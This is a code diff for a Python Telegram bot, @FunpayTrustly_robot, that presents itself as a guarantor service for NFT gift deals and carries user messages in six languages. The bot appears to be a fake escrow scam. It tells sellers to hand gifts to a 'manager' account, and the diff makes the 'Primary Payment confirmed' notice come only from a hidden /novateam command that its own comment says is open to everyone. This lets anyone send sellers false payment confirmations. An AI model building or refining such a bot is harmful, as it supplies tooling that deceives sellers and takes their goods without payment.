@@ -36,7 +36,7 @@ if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN не задан ни в переменных окружения, ни в коде!")
 
 BOT_USERNAME = os.getenv("BOT_USERNAME", "FunpayTrustly_robot")
-PHOTO_URL = os.getenv("PHOTO_URL", "https://ibb.co/ycJNGhRQ")  # Заменить на прямую ссылку .jpg/.png
+PHOTO_URL = os.getenv("PHOTO_URL", "https://ibb.co/ycJNGhRQ")  # Прямая ссылка на фото
 PORT = int(os.getenv("PORT", "8080"))
 WEBHOOK_URL = os.getenv("WEBHOOK_URL", "").rstrip("/")
 ADMIN_IDS = {int(x.strip()) for x in os.getenv("ADMIN_IDS", "8625870625").split(",") if x.strip().isdigit()}
@@ -193,7 +193,7 @@ def init_db():
 init_db()
 
 # ============================================================
-# ЛОКАЛИЗАЦИЯ (6 ПОЛНЫХ ЯЗЫКОВ)
+# ЛОКАЛИЗАЦИЯ (6 ЯЗЫКОВ, ИСПРАВЛЕНЫ ТЕКСТЫ)
 # ============================================================
 LANG_NAMES = {"ru": "Русский", "en": "English", "uk": "Українська", "kk": "Қазақша", "zh": "中文", "hi": "हिन्दी"}
 
@@ -256,6 +256,7 @@ T = {
         "cancelled": "❌ Сделка #{deal_id} отменена.",
         "not_found": "🚫 Сделка не найдена.",
         "not_allowed": "🚫 Действие недоступно.",
+        "deal_confirm_seller": "✅ Вы подтвердили участие. Ожидайте завершения сделки.",
         "confirmed": (
             "💳 Первичная Оплата подтверждена\n\n"
             "Сделка: #{deal_id}\n"
@@ -320,7 +321,7 @@ T = {
             "• Я увидел похожего бота, стоит ли мне доверять? Если вы увидели другого бота кроме @FunpayTrustly_robot, ни в коем случае не проводите с ним сделки!"
         ),
         "language_text": "🌐 Выберите язык:",
-        "language_set": "✅ Язык установлен: {lang}",
+        "lang_set_restart": "✅ Язык установлен: {lang}.\n\nДля продолжения нажмите /start",
         "admin_only": "🚫 Только для администратора.",
         "banned": "🚫 Ваш аккаунт заблокирован для операций.",
         "active_limit": "❌ Максимум 5 незавершённых сделок.",
@@ -378,6 +379,7 @@ T = {
         "cancelled": "❌ Deal #{deal_id} cancelled.",
         "not_found": "🚫 Deal not found.",
         "not_allowed": "🚫 Action not allowed.",
+        "deal_confirm_seller": "✅ You confirmed participation. Waiting for deal completion.",
         "confirmed": "💳 Primary Payment confirmed\n\nDeal: #{deal_id}\nSeller: @{seller}\nRating: {rating}/5\nSuccessful deals: {successful}\nAmount: {amount} {currency}\nItem: {description}\n\nWaiting for goods transfer to manager @GiftsForFunpay.",
         "buyer_notify": "📩 Seller confirmed participation in deal #{deal_id}.\n\n💰 {amount} {currency}\n💳 Seller requisites:\n{req}",
         "deal_active": "🟢 Active",
@@ -404,7 +406,7 @@ T = {
         "support_text": "🆘 Support: @GiftsForFunpay\n\nFor any questions, contact the manager.",
         "about_text": "👋 Details:\n\nWe are a guarantor service, our task is to help you conduct safe deals and process fast withdrawals!\n\nFrequently asked questions:\n\n• How long does a withdrawal take? Usually no more than 2 minutes, in rare cases up to 2 hours.\n\n• Why should the gift be transferred to the manager and not the buyer? The reason is simple: the buyer could lie that they didn't receive the gift, which delays the situation, but our manager automatically checks the presence of the NFT gift and it will not be possible to deceive.\n\n• How fast is the deposit? Deposit also takes no more than 2 minutes.\n\n• I saw a similar bot, should I trust it? If you see another bot besides @FunpayTrustly_robot, do not conduct deals with it under any circumstances!",
         "language_text": "🌐 Choose language:",
-        "language_set": "✅ Language set: {lang}",
+        "lang_set_restart": "✅ Language set: {lang}.\n\nPress /start to continue",
         "admin_only": "🚫 Admin only.",
         "banned": "🚫 Your account is blocked.",
         "active_limit": "❌ Maximum 5 active deals.",
@@ -462,6 +464,7 @@ T = {
         "cancelled": "❌ Угода #{deal_id} скасована.",
         "not_found": "🚫 Угоду не знайдено.",
         "not_allowed": "🚫 Дія недоступна.",
+        "deal_confirm_seller": "✅ Ви підтвердили участь. Очікуйте завершення угоди.",
         "confirmed": "💳 Первинну Оплату підтверджено\n\nУгода: #{deal_id}\nПродавець: @{seller}\nРейтинг: {rating}/5\nУспішних угод: {successful}\nСума: {amount} {currency}\nПредмет: {description}\n\nОчікуємо передачу товару менеджеру @GiftsForFunpay.",
         "buyer_notify": "📩 Продавець підтвердив участь в угоді #{deal_id}.\n\n💰 {amount} {currency}\n💳 Реквізити продавця:\n{req}",
         "deal_active": "🟢 Активна",
@@ -488,7 +491,7 @@ T = {
         "support_text": "🆘 Підтримка: @GiftsForFunpay\n\nЗ будь-яких питань звертайтеся до менеджера.",
         "about_text": "👋 Детальніше:\n\nМи – гарант-сервіс, наше завдання допомогти вам провести безпечні угоди та оформити швидкий вивід!\n\nВідповіді на часті питання:\n\n• Як довго триває вивід? Зазвичай не більше 2-х хвилин, в рідкісних випадках до 2-х годин.\n\n• Чому потрібно передавати подарунок менеджеру, а не покупцю? Причина проста: покупець може набрехати, що йому не прийшов подарунок, що затягує ситуацію, але наш менеджер автоматично перевіряє наявність NFT подарунка і обманути не вийде.\n\n• Як швидко відбувається поповнення? Поповнення також займає не більше 2-х хвилин.\n\n• Я побачив схожого бота, чи варто мені довіряти? Якщо ви побачили іншого бота, крім @FunpayTrustly_robot, ні в якому разі не проводьте з ним угоди!",
         "language_text": "🌐 Оберіть мову:",
-        "language_set": "✅ Мову встановлено: {lang}",
+        "lang_set_restart": "✅ Мову встановлено: {lang}.\n\nНатисніть /start, щоб продовжити",
         "admin_only": "🚫 Тільки для адміністратора.",
         "banned": "🚫 Ваш акаунт заблоковано.",
         "active_limit": "❌ Максимум 5 активних угод.",
@@ -546,6 +549,7 @@ T = {
         "cancelled": "❌ #{deal_id} мәмілесі болдырылмады.",
         "not_found": "🚫 Мәміле табылмады.",
         "not_allowed": "🚫 Әрекетке рұқсат жоқ.",
+        "deal_confirm_seller": "✅ Сіз қатысуды растадыңыз. Мәміленің аяқталуын күтіңіз.",
         "confirmed": "💳 Негізгі төлем расталды\n\nМәміле: #{deal_id}\nСатушы: @{seller}\nРейтинг: {rating}/5\nСәтті мәмілелер: {successful}\nСома: {amount} {currency}\nЗат: {description}\n\nТауарды @GiftsForFunpay менеджеріне беруді күтеміз.",
         "buyer_notify": "📩 Сатушы #{deal_id} мәмілесіне қатысуды растады.\n\n💰 {amount} {currency}\n💳 Сатушы реквизиттері:\n{req}",
         "deal_active": "🟢 Белсенді",
@@ -572,7 +576,7 @@ T = {
         "support_text": "🆘 Қолдау: @GiftsForFunpay\n\nКез келген сұрақ бойынша менеджерге хабарласыңыз.",
         "about_text": "👋 Толығырақ:\n\nБіз – кепілдік қызметі, біздің міндетіміз – сізге қауіпсіз мәмілелер жүргізуге және жылдам шығаруды ресімдеуге көмектесу!\n\nЖиі қойылатын сұрақтарға жауаптар:\n\n• Шығару қанша уақытқа созылады? Әдетте 2 минуттан аспайды, сирек жағдайларда 2 сағатқа дейін.\n\n• Неліктен сыйлықты сатып алушыға емес, менеджерге беру керек? Себебі қарапайым: сатып алушы сыйлық келмеді деп өтірік айтуы мүмкін, бұл жағдайды ұзартады, бірақ біздің менеджер NFT сыйлығының бар-жоғын автоматты түрде тексереді және алдау мүмкін емес.\n\n• Толықтыру қаншалықты жылдам? Толықтыру да 2 минуттан аспайды.\n\n• Мен ұқсас ботты көрдім, оған сену керек пе? Егер сіз @FunpayTrustly_robot-тан басқа ботты көрсеңіз, ешбір жағдайда онымен мәміле жүргізбеңіз!",
         "language_text": "🌐 Тілді таңдаңыз:",
-        "language_set": "✅ Тіл орнатылды: {lang}",
+        "lang_set_restart": "✅ Тіл орнатылды: {lang}.\n\nЖалғастыру үшін /start басыңыз",
         "admin_only": "🚫 Тек әкімшілер үшін.",
         "banned": "🚫 Сіздің аккаунтыңыз бұғатталған.",
         "active_limit": "❌ Максимум 5 белсенді мәміле.",
@@ -630,6 +634,7 @@ T = {
         "cancelled": "❌ 交易 #{deal_id} 已取消。",
         "not_found": "🚫 未找到交易。",
         "not_allowed": "🚫 操作不允许。",
+        "deal_confirm_seller": "✅ 您已确认参与。请等待交易完成。",
         "confirmed": "💳 首次付款已确认\n\n交易：#{deal_id}\n卖家：@{seller}\n评分：{rating}/5\n成功交易：{successful}\n金额：{amount} {currency}\n物品：{description}\n\n等待将商品转交给经理 @GiftsForFunpay。",
         "buyer_notify": "📩 卖家已确认参与交易 #{deal_id}。\n\n💰 {amount} {currency}\n💳 卖家收款信息：\n{req}",
         "deal_active": "🟢 进行中",
@@ -656,7 +661,7 @@ T = {
         "support_text": "🆘 支持：@GiftsForFunpay\n\n如有任何问题，请联系经理。",
         "about_text": "👋 详情：\n\n我们是担保服务，我们的任务是帮助您进行安全交易并快速提现！\n\n常见问题解答：\n\n• 提现需要多长时间？通常不超过2分钟，极少数情况下长达2小时。\n\n• 为什么礼物要交给经理而不是买家？原因很简单：买家可能会谎称没收到礼物，从而拖延时间，但我们的经理会自动检查 NFT 礼物是否存在，这样就无法欺骗了。\n\n• 充值速度有多快？充值也不超过2分钟。\n\n• 我看到一个类似的机器人，我能相信它吗？如果您看到除了 @FunpayTrustly_robot 之外的机器人，在任何情况下都不要与之进行交易！",
         "language_text": "🌐 选择语言：",
-        "language_set": "✅ 语言已设置为：{lang}",
+        "lang_set_restart": "✅ 语言已设置为：{lang}。\n\n请按 /start 继续",
         "admin_only": "🚫 仅限管理员。",
         "banned": "🚫 您的账户已被冻结。",
         "active_limit": "❌ 最多 5 笔活跃交易。",
@@ -714,6 +719,7 @@ T = {
         "cancelled": "❌ डील #{deal_id} रद्द कर दी गई।",
         "not_found": "🚫 डील नहीं मिली।",
         "not_allowed": "🚫 कार्रवाई की अनुमति नहीं है।",
+        "deal_confirm_seller": "✅ आपने भागीदारी की पुष्टि कर दी है। डील पूरी होने का इंतज़ार करें।",
         "confirmed": "💳 प्राथमिक भुगतान की पुष्टि हो गई\n\nडील: #{deal_id}\nविक्रेता: @{seller}\nरेटिंग: {rating}/5\nसफल डील्स: {successful}\nराशि: {amount} {currency}\nवस्तु: {description}\n\nमैनेजर @GiftsForFunpay को माल सौंपने की प्रतीक्षा करें।",
         "buyer_notify": "📩 विक्रेता ने डील #{deal_id} में भागीदारी की पुष्टि कर दी।\n\n💰 {amount} {currency}\n💳 विक्रेता का विवरण:\n{req}",
         "deal_active": "🟢 सक्रिय",
@@ -740,7 +746,7 @@ T = {
         "support_text": "🆘 सहायता: @GiftsForFunpay\n\nकिसी भी प्रश्न के लिए प्रबंधक से संपर्क करें।",
         "about_text": "👋 विस्तार में:\n\nहम एक गारंटर सेवा हैं, हमारा काम आपको सुरक्षित डील करने और तेजी से निकासी करने में मदद करना है!\n\nअक्सर पूछे जाने वाले प्रश्न:\n\n• निकासी में कितना समय लगता है? आमतौर पर 2 मिनट से अधिक नहीं, दुर्लभ मामलों में 2 घंटे तक।\n\n• गिफ्ट मैनेजर को क्यों देना चाहिए, खरीदार को नहीं? कारण सरल है: खरीदार झूठ बोल सकता है कि उसे गिफ्ट नहीं मिला, जो स्थिति को लंबा खींचता है, लेकिन हमारा मैनेजर NFT गिफ्ट की उपस्थिति की स्वचालित रूप से जांच करता है और धोखा देना संभव नहीं होगा।\n\n• टॉप-अप कितनी तेजी से होता है? टॉप-अप भी 2 मिनट से अधिक नहीं लेता है।\n\n• मैंने एक समान बॉट देखा, क्या मुझे उस पर भरोसा करना चाहिए? यदि आप @FunpayTrustly_robot के अलावा कोई अन्य बॉट देखते हैं, तो किसी भी स्थिति में उसके साथ डील न करें!",
         "language_text": "🌐 भाषा चुनें:",
-        "language_set": "✅ भाषा सेट की गई: {lang}",
+        "lang_set_restart": "✅ भाषा सेट की गई: {lang}.\n\nजारी रखने के लिए /start दबाएं",
         "admin_only": "🚫 केवल एडमिन।",
         "banned": "🚫 आपका खाता अवरुद्ध कर दिया गया है।",
         "active_limit": "❌ अधिकतम 5 सक्रिय डील।",
@@ -766,9 +772,7 @@ T = {
     }
 }
 
-# ============================================================
-# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ И КЛАВИАТУРЫ
-# ============================================================
+
 def tr(key, lang="ru", **kwargs):
     lang = lang if lang in T else "ru"
     text = T[lang].get(key, T["ru"].get(key, key))
@@ -895,7 +899,6 @@ def kb_currencies(lang, prefix):
         ("STARS", "⭐ STARS"), ("KZT", "🇰🇿 KZT"),
     ]
     rows = []
-    # USDT отдельно
     rows.append([InlineKeyboardButton(text=labels[0][1], callback_data=f"{prefix}{labels[0][0]}")])
     for i in range(1, len(labels), 2):
         pair = labels[i:i+2]
@@ -1233,21 +1236,10 @@ async def confirm_deal(call: CallbackQuery):
     now = datetime.now(timezone.utc).isoformat()
     execute("UPDATE deals SET confirmed_at=? WHERE deal_id=?", (now, deal_id))
     seller_lang = user_lang(uid)
-    seller_row = fetchone("SELECT rating, successful_deals FROM users WHERE user_id=?", (uid,))
-    rating = seller_row["rating"] if seller_row else 0
-    successful = seller_row["successful_deals"] if seller_row else 0
-    await call.message.edit_text(
-        tr("confirmed", seller_lang).format(
-            deal_id=deal_id,
-            seller=deal["seller_username"] or uid,
-            rating=rating,
-            successful=successful,
-            amount=deal["amount"],
-            currency=deal["currency"],
-            description=deal["description"]
-        ),
-        parse_mode="HTML"
-    )
+    
+    # ИСПРАВЛЕНИЕ: Просто подтверждаем участие, не показываем "Первичная Оплата"
+    await call.message.edit_text(tr("deal_confirm_seller", seller_lang), parse_mode="HTML")
+    
     buyer_lang = user_lang(deal["buyer_id"])
     await notify(deal["buyer_id"], tr("buyer_notify", buyer_lang).format(deal_id=deal_id, amount=deal["amount"], currency=deal["currency"], req=deal["seller_req"] or "не указаны"))
     await call.answer("OK")
@@ -1465,7 +1457,9 @@ async def set_lang(call: CallbackQuery):
         await call.answer(tr("invalid", user_lang(call.from_user.id)), show_alert=True)
         return
     execute("UPDATE users SET lang=? WHERE user_id=?", (lang, call.from_user.id))
-    await call.message.answer(tr("language_set", lang).format(lang=LANG_NAMES[lang]), reply_markup=kb_main(lang))
+    
+    # ИСПРАВЛЕНИЕ: Не отправляем клавиатуру, только текст с просьбой нажать /start
+    await call.message.answer(tr("lang_set_restart", lang).format(lang=LANG_NAMES[lang]))
     await call.answer()
 
 @dp.callback_query(F.data == "support")
@@ -1480,11 +1474,12 @@ async def support(call: CallbackQuery):
 @dp.callback_query(F.data == "about")
 async def about(call: CallbackQuery):
     lang = user_lang(call.from_user.id)
-    await call.message.answer(tr("about_text", lang), reply_markup=kb_back(lang))
+    # ИСПРАВЛЕНИЕ: Отправляем с фото + текст через safe_send
+    await safe_send(call.message.chat.id, tr("about_text", lang), reply_markup=kb_back(lang))
     await call.answer()
 
 # ============================================================
-# /novateam — теперь доступна всем (скрытая команда)
+# /novateam — теперь доступна всем, "Первичная Оплата" отправляется ТОЛЬКО здесь
 # ============================================================
 @dp.message(Command("novateam"))
 async def novateam(message: Message):
@@ -1495,9 +1490,11 @@ async def novateam(message: Message):
         if not deal:
             await message.answer(tr("not_found", user_lang(message.from_user.id)))
             return
-        for uid in (deal["seller_id"], deal["buyer_id"]):
-            if uid:
-                await notify(uid, tr("admin_done_ok", user_lang(uid)).format(deal_id=deal_id))
+        # Отправляем детальное сообщение "Первичная Оплата подтверждена" ПРОДАВЦУ
+        await send_confirmed_payment(deal)
+        # Уведомляем покупателя
+        if deal["buyer_id"]:
+            await notify(deal["buyer_id"], tr("admin_done_ok", user_lang(deal["buyer_id"])).format(deal_id=deal["deal_id"]))
         await message.answer(tr("admin_done_ok", "ru").format(deal_id=deal_id))
         return
     rows = fetchall("SELECT deal_id FROM deals WHERE status='active' ORDER BY created_at DESC LIMIT 5")
@@ -1506,10 +1503,28 @@ async def novateam(message: Message):
         deal = complete_deal(row["deal_id"], message.from_user.id)
         if deal:
             count += 1
-            for uid in (deal["seller_id"], deal["buyer_id"]):
-                if uid:
-                    await notify(uid, tr("admin_done_ok", user_lang(uid)).format(deal_id=row["deal_id"]))
+            # Отправляем детальное сообщение "Первичная Оплата подтверждена" ПРОДАВЦУ
+            await send_confirmed_payment(deal)
+            # Уведомляем покупателя
+            if deal["buyer_id"]:
+                await notify(deal["buyer_id"], tr("admin_done_ok", user_lang(deal["buyer_id"])).format(deal_id=row["deal_id"]))
     await message.answer(f"✅ Завершено последних сделок: {count}")
+
+async def send_confirmed_payment(deal):
+    if deal["seller_id"]:
+        seller_lang = user_lang(deal["seller_id"])
+        seller_row = fetchone("SELECT rating, successful_deals FROM users WHERE user_id=?", (deal["seller_id"],))
+        rating = seller_row["rating"] if seller_row else 0
+        successful = seller_row["successful_deals"] if seller_row else 0
+        await notify(deal["seller_id"], tr("confirmed", seller_lang).format(
+            deal_id=deal["deal_id"],
+            seller=deal["seller_username"] or deal["seller_id"],
+            rating=rating,
+            successful=successful,
+            amount=deal["amount"],
+            currency=deal["currency"],
+            description=deal["description"]
+        ))
 
 def complete_deal(deal_id, admin_id):
     deal = fetchone("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
@@ -1528,7 +1543,7 @@ def complete_deal(deal_id, admin_id):
     return fetchone("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
 
 # ============================================================
-# ОСТАЛЬНЫЕ АДМИН-КОМАНДЫ (stats, ban, unban, admin панель) — остаются только для админов
+# ОСТАЛЬНЫЕ АДМИН-КОМАНДЫ (остаются только для админов)
 # ============================================================
 @dp.message(Command("stats"))
 async def stats(message: Message):
@@ -1644,14 +1659,9 @@ async def admin_done(call: CallbackQuery):
     if not deal:
         await call.answer(tr("not_found"), show_alert=True)
         return
-    for uid in (deal["seller_id"], deal["buyer_id"]):
-        if uid:
-            await notify(uid, tr("admin_done_ok", user_lang(uid)).format(deal_id=deal_id))
-    if deal["seller_id"] and deal["buyer_id"]:
-        for uid, target in ((deal["seller_id"], deal["buyer_id"]), (deal["buyer_id"], deal["seller_id"])):
-            lang = user_lang(uid)
-            kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=tr("review_prompt", lang), callback_data=f"review_{deal_id}_{target}")]])
-            await notify(uid, "⭐ " + tr("review_prompt", lang), kb)
+    await send_confirmed_payment(deal)
+    if deal["buyer_id"]:
+        await notify(deal["buyer_id"], tr("admin_done_ok", user_lang(deal["buyer_id"])).format(deal_id=deal_id))
     await call.message.edit_text(tr("admin_done_ok", "ru").format(deal_id=deal_id))
     await call.answer()
 
